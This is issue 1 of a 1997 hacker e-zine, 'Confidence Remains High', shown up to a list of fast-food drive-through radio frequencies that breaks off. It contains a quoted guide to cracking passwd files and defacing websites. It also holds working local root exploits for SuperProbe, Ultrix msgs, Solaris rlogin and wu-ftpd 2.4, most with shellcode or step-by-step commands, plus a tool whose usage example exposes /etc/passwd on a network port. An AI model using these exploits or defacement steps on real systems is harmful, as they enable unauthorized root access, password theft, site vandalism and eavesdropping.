ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
=--------------------=====================================--------------------=
=--------------------= Status : Confidence Remains High. =--------------------=
=--------------------=  Issue : 001.                     =--------------------=
=--------------------=   Date : April 16th  1997.        =--------------------=
=--------------------=====================================--------------------=
===============================================================================
==================>  http://www.codez.com UP FUCKEN NOW!@#  <==================
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
                          .:. Site Of The Month .:.
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

-----------------------> http://micros0ft.paranoia.com <-----------------------

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  In This Issue :
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

 -----=>  Section A  :  Introduction And Cover Story.

 1. Welcome To Issue 1 Of Confidence Remains High......: Tetsu Khan
 2. sIn eXposed........................................: The CodeZero + Friends

 -----=>  Section B  :  Exploits And Code.

 1. SuperProbe.........................................: Solar Designer
 2. Ultrix Exploit.....................................: StatioN
 3. Solaris 2.5 / 2.5.1 rlogin Exploit.................: Jeremy Elson
 4. wu-ftpd 2.4(1) Exploit.............................: Eugene Schultz

 5. portmsg.c..........................................: Some FTP Someplace..

 -----=>  Section C  :  Phones / Scanning / Radio.

 1. Fast Food Restuarant Frequencies...................: Dj Gizmo
 2. Robbing Stores With Phones, A Real Example.........: The CrackHouse
 3. How To Rewire Your House For Free Phone Calls......: WildFire

 -----=>  Section D  :  Miscellaneous.

 1. Hacking Electrical Items Part 2, The Sequel........: Tetsu Khan
 2. Virus Definitions..................................: so1o
 3. Fun With whois, sinnerz.com........................: so1o
 4. Hacking Space Shuttles, Abort Codes................: NailGun
 5. Country Domain Listing.............................: SirLance

 -----=>  Section E  :  World News.

 1. CoreWars...........................................: so1o / odÝphreak
 2. Technophoria Want A Piece Of CodeZero Too?.........: so1o
 3. Global kOS Press Release...........................: Spidey
 4. www.ncaa.com Hack Makes News.......................: so1o
 5. CodeZero To Release sunOS 5.x RootKit..............: so1o
 6. Too Many nethosting.com Break-Ins..................: so1o
 7. sulfur of #hack to print a bi-monthly magazine.....: so1o
 8. 2600 Printers go bust and take $9000 with them.....: so1o

 ------=> Section F  :  Projects.

 1. IP Spoofing Programs And Utilities.................: Dr_Sp00f
 2. Using LinuxRootKitIII..............................: suid

 -----=> Section G  :  The End.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ INTRO ]====================[ .SECTION A. ]======================[ INTRO ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. Welcome To Issue 1 Of Confidence Remains High : Tetsu Khan
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Confidence Remains High will be issued EVERY 50 DAYS as from April 16th...
It is free, not like 2600, or sulfur's soon to be released Access Denied, which
both cost *YOU*, the reader MONEY, cash, $$$ etc. which we don't like, because
information should be free, and so, we bring you Confidence Remains High, with
news, exploits, scanning, telco, and enough shit to make you wonder "why did I
ever pay cash for this?!" anyway, on with the show...

==================>  http://www.codez.com UP FUCKEN NOW!@#  <==================
==================>  http://www.codez.com UP FUCKEN NOW!@#  <==================
==================>  http://www.codez.com UP FUCKEN NOW!@#  <==================

Confidence Remains High is issued every 50 days as from April 16th, as then,
issue 20 will be released on New Years Day 2000 (if we go that far!)

Tetsu Khan.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. sIn eXposed : CodeZero + Friends.
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

If you cant be bothered to read all this shit, just go to...

        ---------------> www.sinnerz.com/bible.htm <---------------

                                      ...And view the lameness for yourself :)

-------------------------------------------------------------------------------

Concerning the news in issue 2 of the CodeZero technical journal, we found
this response (http://www.sinnerz.com/codezero.txt) :

So has anyone here heard of Codezero? Its some ezine type shit that i just 
wanted to expose as bullshit. I had never heard of it till i talked to 
darkfool and he showed me... You can check it out at neonunix.org/codezero.
It is pretty good for a laugh. When me and Banshee and Messiah first read it
we all were in #sin and the first thing to come to our mind was.. wtf is this?
Some hacker gossip column or what? Even more funny was the surprise i got 
when i saw that the editor was Tetsu Khan (so1o who was mentioned earlier
in the Bible)... that brought a smile to my face to see that. Anyways so 
i was reading thru issue 2 of codezero and i happend to see a lot of bogus
information...stuff said that wasn't true. Same with the first issue. 
Examples our comments like "Infected has some new programs coming out soon
including Utopia an encryption program by The Messiah." Anyways im doing
the algorithm for that program with Messiah and it is not going to be out 
for a long time... Messiah has a lot of plans for the future all coming
before Utopia does....

Those are the exact, untouched words of HosTiÝe of SiN, hmmm, lets examine
that passage more closely...

  "some ezine type shit that i just wanted to expose as bullshit..."

  "i was reading thru issue 2 of codezero and i happend to see a lot of bogus
   information...stuff said that wasn't true..."

This is very interesting indeed, that they should care about a small news
section in the journal isn't it? seeing that we published how many lines about
them? a whole 20 I hear you say? hmm...doesn't the journal have exploits and
other stuff in it to? I think it does...

  "Anyways im doing the algorithm for that program with Messiah and it is not
   going to be out for a long time... Messiah has a lot of plans for the future
   all coming before Utopia does...."

So then HoStiÝe, you can program now? thats new, and *YOU* are coding the
algorithm? intersting... WAIT! you are saying that Utopia is true? and that
we did publish correct information? I always thought so, seeing that the truth
is that you probably wanted your beautiful new program to be a big surpise
to the "scene"...

Heh, how silly of me to actually think you had a clue! You just can't take it
that you are stuck in a lame fuck group of wannabes and the truth is finally
coming out...Let us examine more examples found on www.sinnerz.com :

It also had some shit like "4 new hacks were reported this month" and they
were right on the 4 new hacks part but they put bogus shit about them.
The catch22 one they happend to put the html for it.. well they put the
wrong shit that was on it. Becuz on the catch22 hack Darkfool had put the
names of all the SIN members on the page. Which they decided to leave out...
also They put some weird shit which they said was on the 2 hacks Darkfool did.
Where it was the entersin.gif from our page that was there with a bunch of
other links. Anyways there is also a lot of other shit that was bullshit in
both of their issues...

SHoCk HoRRoR !!!! Darkfool was responsible for the www.catch22.com hack ??
and SiN was linked to the hacks too?? That is interesting news HoSTiÝe, seeing
you just could have landed one of your SiN members in trouble, as CodeZero
didn't mention any names concerning the catch22.com hack, and the very first
index.html to go up, which was the one we published was infact very correct,
its just that the index.html must have changed how many times that day?
hmmm...

  "...wrong shit that was on it. Becuz on the catch22 hack Darkfool had put the
   names of all the SIN members on the page. Which they decided to leave out..."

Strange...seeing another hacker, by the name of Sventa, was blamed entirely for
the attacks. Oh yeah, one last thing, in the index.html that was apparently
modified by Darkfool of SiN, there were 8 numbers, we know what they stand for,
SiN doesn't, all will be explained one day, as SiN are cl00less and need a good
kicking.

Let us continue, with a "hacking guide" taken from www.sinnerz.com :
--------------------------------------------------------------------
                          _________  ___  _______      
   \~=._      _.=~/      /   _____/ |   | \      \       \~=._      _.=~/ 
    \   ~=__=~   /       \_____  \  |   | /   |   \       \   ~=__=~   /
     \_.=~  ~=._/        /        \ |   |/    |    \       \_.=~  ~=._/ 
 _.=~ \        / ~=._   /_______  / |___|\____|__  /    .=~ \        / ~=.
L------\------/------7          \/               \/   L------\------/------7
        \    /                                                \    / 
         \  /             http://www.sinnerz.com               \  /   
          \/                                                    \/


OK, this is my mini guide to the easiest 'hacking' there is ( I think ) if any
one knows different then mail me and tell me :) .

Most FTP servers have the directory /pub  which stores all the 'public'
information for you to download. But along side /pub you will probably find
other directorys such as /bin and /etc    its the /etc  directory which is
important. In this directory there is normally a file called passwd.  .
This looks something like this :-

root:7GHgfHgfhG:1127:20:Superuser
jgibson:7fOsTXF2pA1W2:1128:20:Jim Gibson,,,,,,,:/usr/people/jgibson:/bin/csh
tvr:EUyd5XAAtv2dA:1129:20:Tovar:/usr/people/tvr:/bin/csh
mcn:t3e.QVzvUC1T.:1130:20:Greatbear,,,,,,,:/usr/people/mcn:/bin/csh
mouse:EUyd5XAAtv2dA:1131:20:Melissa P.:/usr/people/mouse:/bin/csh

This is where all the user names and passwords are kept. For example, root is 
the superuser and the rest are normal users on the site. The bit after the
word root or mcn such as in this example (EUyd5XAAtv2dA) is the password BUT
it is encrypted. So you use a password cracker....which you can d/l from
numerous sites which I will give some URL's to at the end of this document.
With these password crackers you will be asked to supply a passwd. file which
you download from the \etc directory of the FTP server and a dictionary file
which the crackers progam will go through and try to see if it can make any
match. And as many people use simple passwords you can use a 'normal'
dictionary file. But when ppl REALLY don't want you to break their machines
they set their passwords to things such as GHTiCk45 which Random Word
Generator will create (eventually ). Which is where programs such as Random
Word Generator come in. ( Sorry just pluging my software )

BTW the bad news is that new sites NORMALLY have password files which look
like this :-

root:x:0:1:0000-Admin(0000):/:/sbin/sh

The x signifies shadowed - you can't use a cracker to crack it because there's
nothing there to crack, its hidden somewhere else that you can't get to. x is
also represented as a * or sometimes a .  Ones like the top example are known
as un-shadowed password files normally found at places with .org domain or .net
and prehaps even .edu sites. (Also cough .nasa.gov cough sites).

If you want a normal dictionary file i recommend you go to 
http://www.globalkos.org and download kOS Krack which 
has a 3 MEG dictionary file. Then run a .passwd cracking program 
such as jack the ripper or hades or killer crack ( I recommend ) against the 
.passwd file and dictionary file. Depending upon the amount of passwords in 
the .passwd file, the size of the dictionary file and the speed of the processor
it could be a lengthy process.
Eventually once you have cracked a password you need a basic knowledge of unix.
I have included the necassary commands to upload a different index.html file to
a server :-
Connect to a server through ftp prefably going through a few shells to hide your
host and login using the hacked account at the Login: Password: part.
Then once connected type

dir or list 
If there's a directory called public_html@ or something similar change
directory using the Simple dos cd command ( cd public_html )

Then type binary to set the mode to binary transfer ( so you can send images
if necassary )

Then type put index.html  or whatever the index file is called.

It will then ask which transfer you wish to use, Z-Modem is the best. 
Select the file at your end you wish to upload and send it.
Thats it !

If you have root delete any log files too.

Please note that this process varys machine to machine.
To change the password file for the account ( very mean ) login in through
telnet and simply type passwd at the prompt and set the password for the
account to anything you wish.

Thats it....if ya don't understand it read it about 10x if ya still don't
ask someone else i am too busy with errrr stuff..

Links :-
http://www.sinnerz.com  Where you got this I hope.
Stay cool and be somebodys fool everyone

Darkfool
darkfool@pancreas.com
http://www.sinnerz.com

---

Ummm, *NEWS FLASH*, lets see shall we, this tells attackers to retrieve the
passwd file using what?! FTP I hear you scream? well, lets see shall we
children, gather 'round...

  "Most FTP servers have the directory /pub  which stores all the 'public'
   information for you to download. But along side /pub you will probably
   find other directorys such as /bin and /etc    its the /etc  directory
   which is important. In this directory there is normally a file called
   passwd.  .   This looks something like this :-"

Oh dear, oh dear, oh dear, lets look at the FACTS :

     Common FTP passwd path : /home/ftp/etc/passwd
         *REAL* passwd path : /etc/passwd

Hmm, lets see, anyone with a clue would know that the FTP passwd file is not
real, it is only there to mislead little wannabes, examples iclude members of
SiN.

We continue...

  "Eventually once you have cracked a password you need a basic knowledge of
   unix. I have included the necassary commands to upload a different
   index.html file to a server :-
   Connect to a server through ftp prefably going through a few shells to hide
   your host and login using the hacked account at the Login: Password: part.
   Then once connected type 

   dir or list 
   If there's a directory called public_html@ or something similar change
   directory using the Simple dos cd command ( cd public_html )

   Then type binary to set the mode to binary transfer ( so you can send images
   if necassary )

   Then type put index.html  or whatever the index file is called.

   It will then ask which transfer you wish to use, Z-Modem is the best. 
   Select the file at your end you wish to upload and send it.
   Thats it !"

Okay, so now, SiN defines hacking as downloading the /home/ftp/etc/passwd
which is a decoy, and then proceed to get kOS Krack (last time I checked
www.globalkos.org was down) and then try to crack the passwd file and
finally use FTP to upload an index.html? how imaginative and original, pity
all of this info you have been fed is absolute crap, with a success rate of
practically zero. One last thing...

  "If you have root delete any log files too."

Umm, but you havent told all our wannabe hackers that read your shit where the
log files are found, seeing that you have to find them, delete them, then
touch them, oh yeah, I thought you were using FTP? strange...

Im sure that from these examples we have fowarded to you we have started to
prove the truth behind SiN, seeing they are actually quite lame wannabes with
very minimal skills...this has been shown, and we will continue to add to this
hall of shame for SiN, as until now, no-one has stood up to them, but now it
is time for a change. Watch this space my friends, Until next time...

T_K

I wish I was in sIn, I dew I dew! I dew!! sIn is 3r33t!! -- so1o

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ EXPLOITS ]=================[ .SECTION B. ]===================[ EXPLOITS ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. SuperProbe : Solar Designer
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

/*
 * SuperProbe buffer overflow exploit for Linux, tested on Slackware 3.1
 * by Solar Designer 1997.
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char *shellcode =
  "\x31\xc0\xb0\x31\xcd\x80\x93\x31\xc0\xb0\x17\xcd\x80\x68\x59\x58\xff\xe1"
  "\xff\xd4\x31\xc0\x8d\x51\x04\x89\xcf\x89\x02\xb0\x2e\x40\xfc\xae\x75\xfd"
  "\x89\x39\x89\xfb\x40\xae\x75\xfd\x88\x67\xff\xb0\x0b\xcd\x80\x31\xc0\x40"
  "\x31\xdb\xcd\x80/"
  "/bin/sh"
  "0";

char *get_sp() {
  asm("movl %esp,%eax");
}

#define bufsize 8192
#define alignment 0
char buffer[bufsize];

main() {
  int i;

  for (i = 0; i < bufsize / 2; i += 4)
    *(char **)&buffer[i] = get_sp() - 2048;
  memset(&buffer[bufsize / 2], 0x90, bufsize / 2);
  strcpy(&buffer[bufsize - 256], shellcode);
  setenv("SHELLCODE", buffer, 1);

  memset(buffer, 'x', 72);
  *(char **)&buffer[72] = get_sp() - 6144 - alignment;
  buffer[76] = 0;

  execl("/usr/X11/bin/SuperProbe", "SuperProbe", "-nopr", buffer, NULL);
}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. Ultrix Exploit : StatioN
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

This bug has been fixed in OSF, but not in Ultrix.
It should also work on any system that has the msgs mail alias.
 
$ grep msgs /etc/aliases
msgs: "|/usr/ucb/msgs -s"
 
Ok, the first thing to do is look in the /usr/msgs directory (or whatever
the directory is where the msgs files are kept), and see what the next msgs
file will be (if there is 1 and 2, then the next one is pretty easy to figure
out).
 
Then, make an executable /tmp/a that like makes a suid shell (this is pretty
easy to do, if you can't do it, don't consider yourself a hacker).
 
By default, newsyslog executes every 6 days at 4 am, but it depends on the
setup in crontab.  What it does is age the syslog file (at /usr/adm/syslog.1,
.2, ..., i think).
 
symlink /usr/msgs/<nextmsg> -> /usr/adm/newsyslog
 
$ telnet
telnet> o localhost 25
mail shit, version, etc
expn msgs
250 <"| /usr/ucb/msgs -s">
mail from: <`/tmp/a`>
rcpt to: msgs
data
doesn't matter what you put here
 .
 quit

 So now, when it writes to /usr/msgs/<nextmsg>, it will overwrite
 /usr/adm/newsyslog, and since /usr/adm/newsyslog is a shell script, it will
 expand `/tmp/a` by executing /tmp/a AS ROOT, giving you an suid shell or
 whatever /tmp/a does.

From there, just clean up after yourself. StatioN

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  3. Solaris 2.5 / 2.5.1 rlogin Exploit : Jeremy Elson
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

/*
 * rlogin-exploit.c: gets a root shell on most Solaris 2.5/2.5.1 machines
 * by exploiting the gethostbyname() overflow in rlogin.
 *
 * gcc -o rlogin-exploit rlogin-exploit.c
 *
 * Jeremy Elson, 
 * jeremy.elson@nih.gov
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

#define BUF_LENGTH      8200
#define EXTRA           100
#define STACK_OFFSET    4000
#define SPARC_NOP       0xa61cc013

u_char sparc_shellcode[] =
"\x82\x10\x20\xca\xa6\x1c\xc0\x13\x90\x0c\xc0\x13\x92\x0c\xc0\x13"
"\xa6\x04\xe0\x01\x91\xd4\xff\xff\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e"
"\x2f\x0b\xdc\xda\x90\x0b\x80\x0e\x92\x03\xa0\x08\x94\x1a\x80\x0a"
"\x9c\x03\xa0\x10\xec\x3b\xbf\xf0\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc"
"\x82\x10\x20\x3b\x91\xd4\xff\xff";

u_long get_sp(void)
{
  __asm__("mov %sp,%i0 \n");
}

void main(int argc, char *argv[])
{
  char buf[BUF_LENGTH + EXTRA];
  long targ_addr;
  u_long *long_p;
  u_char *char_p;
  int i, code_length = strlen(sparc_shellcode);

  long_p = (u_long *) buf;

  for (i = 0; i < (BUF_LENGTH - code_length) / sizeof(u_long); i++)
    *long_p++ = SPARC_NOP;

  char_p = (u_char *) long_p;

  for (i = 0; i < code_length; i++)
    *char_p++ = sparc_shellcode[i];

  long_p = (u_long *) char_p;

  targ_addr = get_sp() - STACK_OFFSET;
  for (i = 0; i < EXTRA / sizeof(u_long); i++)
    *long_p++ = targ_addr;

  printf("Jumping to address 0x%lx\n", targ_addr);

  execl("/usr/bin/rlogin", "rlogin", buf, (char *) 0);
  perror("execl failed");
}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  4. wu-ftpd 2.4(1) Exploit : Eugene Schultz
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

This sploit is a teeny bit outdated, but I have been asked by many people about
exploiting FTP recently...

This shows you how to use the wuftp2.4(1) hole to gain root.
------------------------------------------------------------

On the VICTIM system, compile the following C code:           
---------------------------------------------------

main()
{
setuid(0);
seteuid(0);

system("cp /bin/sh /tmp/suidroot");
system("chmod a+rwxs /tmp/suidroot");
}


Now create a shell script, called root.sh, that contains the following:
-----------------------------------------------------------------------

exec a.out      <----- a.out is the name of the compiled C code


Now, FTP localhost, login as your account on that system and:
-------------------------------------------------------------

ftp> quote site exec sh root.sh

Then quit FTP and execute /tmp/suidroot to become root!

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  5. portmsg.c : Some FTP Someplace..
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

/**************************************************************************/
/*      portmsg - generate a message on a port, then close connection      */
/*                                                                         */
/*      Usage:  portmsg file port                                          */
/*                                                                         */
/*              When a telnet client connects to the specified port, the   */
/*              text from the file will be echoed to the user.  After a    */
/*              short delay the connection will close.                     */
/*                                                                         */
/*      eg. portmsg /etc/passwd 666                                        */ 
/*                                                                         */
/***************************************************************************/

#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/file.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/param.h>
#include <signal.h>
#include <sys/wait.h>

wait_on_child()
{
    union wait status;

    while (wait3(&status, WNOHANG, (struct rusage *) 0) > 0)
	;
}

lostconn()
{
    exit(1);
}

main(argc, argv)
        int argc;
        char *argv[];
{
    int msgfd, fd, n;
    struct stat statBuf;
    int port;
    char *msg;
    int sockfd, newsockfd;
    int addrlen; int opt;
    struct sockaddr_in tcp_srv_addr;
    struct sockaddr_in their_addr;

    if (argc != 3) {
	fprintf(stderr, "Usage: portmsg file port\n");
	exit(1);
    }

    port = atoi(argv[2]);
    if (port == 0) {
	fprintf(stderr, "error: bad port number [%s]\n", argv[2]);
	exit(1);
    }
    if ((msgfd = open(argv[1], O_RDONLY)) < 0) {
	fprintf(stderr, "error: cannot open message file [%s]\n", argv[1]);
	exit(1);
    }
    /* read the message */
    fstat(msgfd, &statBuf);
    if (statBuf.st_size <= 0) {
	fprintf(stderr, "error: message file [%s] is empty\n", argv[1]);
	exit(1);
    }
    msg = (char *)malloc(statBuf.st_size);
    if (read(msgfd, msg, statBuf.st_size) != statBuf.st_size) {
	fprintf(stderr, "error: cannot read message file [%s]\n", argv[1]);
	exit(1);
    }

    /* become a daemon */
    switch(fork()) {
    case -1:
	fprintf(stderr, "error: can't fork\n");
	exit(1);
    case 0:
	break;
    default:
	exit(0);
    }
    if (setpgrp(0, getpid()) == -1) {
	fprintf(stderr, "error: can't change process group\n");
	exit(1);
    }
    if ((fd = open("/dev/tty", O_RDWR)) >= 0) {
	ioctl(fd, TIOCNOTTY, NULL);
	close(fd);
    }

    (void)signal(SIGCLD, wait_on_child);
    bzero((char *) &tcp_srv_addr, sizeof(tcp_srv_addr));
    tcp_srv_addr.sin_family = AF_INET;
    tcp_srv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    tcp_srv_addr.sin_port = htons(port);

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
	fprintf(stderr, "can't create stream socket\n");
	exit(-1);
    }
    opt = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR,
		 (char *) &opt, sizeof(opt)) < 0) {
    perror("setsockopt");
    exit(1);
    }
    if (bind(sockfd, (struct sockaddr *)&tcp_srv_addr,
	     sizeof(tcp_srv_addr)) < 0) {
	fprintf(stderr, "can't bind local address\n");
	exit(-1);
    }
    listen(sockfd, 5);

main_again:
    addrlen = sizeof (their_addr);
    newsockfd = accept(sockfd, (struct sockaddr *) &their_addr, &addrlen);
    if (newsockfd < 0) {
	if (errno == EINTR)
	    goto main_again;
	fprintf(stderr, "accept error\n");
	exit(-1);
    }

    switch(fork()) {
    case -1:
	fprintf(stderr, "server can't fork\n");
	exit(-1);
    case 0:
	dup2(newsockfd, 0);
	dup2(newsockfd, 1);
	for (n = 3; n < NOFILE; n++)
	    close(n);
	break;
    default:
	close(newsockfd);
	goto main_again;
    }

    /* daemon child arrives here */
    (void)signal(SIGPIPE, lostconn);
    (void)signal(SIGCHLD, SIG_IGN);

    fprintf(stdout, msg);
    (void)fflush(stdout);
    sleep(5);
    exit(0);
}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ FONES / SCANNING ]=========[ .SECTION C. ]===========[ FONES / SCANNING ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. Fast Food Restuarant Frequencies : Dj Gizmo
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

If you got a scanner and or transciever that works with these frequencies, then
you could have some serious phun...

-------------------------------------------------------------------------------
 RESTAURANT                 CUSTOMER (R)    CLERK (I)      LOCATION
-------------------------------------------------------------------------------

Arby's                       30.8400       154.5700      Nationwide

Bess Eaton Donut            457.5375       467.7625      Rhode Island

Big Boy                      30.8400       154.5700      UNKNOWN OH area
                            457.6000       467.8250      UNKNOWN OH area

Burger King                  30.8400       154.5700      UNKNOWN OH area
                             31.0000       170.3050      UNKNOWN GA area
                             33.4000       154.5400      Frederick, MD
                            457.5500       467.7750      Baltimore, MD area
                            457.5625       467.7875      Nationwide
                            457.5750       467.8000      UNKNOWN area
                            457.6000       467.8250      UNKNOWN area
                            460.8875       465.8875      Nationwide
                            461.5375       UNKNOWN       UNKNOWN OH area

Burgerville                  30.8400       154.5700      UNKNOWN OH area

Dairy Queen                  30.8400       154.5700      UNKNOWN OH area
                            460.8875       465.8875      UNKNOWN OH area
                            920.2625 WFM   UNKNOWN       Halifax, Nova Scotia

Dunkin Donuts                30.8400       154.5700      UNKNOWN NH area
                             33.1600       154.5150      UNKNOWN NH area
                             33.4000       154.5400      UNKNOWN NH area     
  

El Mexicano                 464.9625       469.9625      Germantown, MD

G.D. Ritzy's                 35.1000       UNKNOWN       UNKNOWN OH area

Hardee's                     30.8400       154.5700      Nationwide
                             31.0000       170.3050      UNKNOWN NC area
                            457.5375       467.7625      UNKNOWN OH area
                            460.8875       465.8875      UNKNOWN OH area
                            461.0875       466.0875      UNKNOWN OH area
                            461.1125       466.1125      Aurora, IL area

Jack in the Box              33.4000       154.5400      San Jose, CA

Kenny Rogers Roasters       469.0125       464.0125      Frederick, MD
Chicken

Kentucky Fried Chicken       30.8400       154.5700      Occoquan, VA area
                             31.0000       170.3050      UNKNOWN MN area
                             33.1400       151.8950      UNKNOWN OH area
                             35.0200       154.6000      Frederick, MD
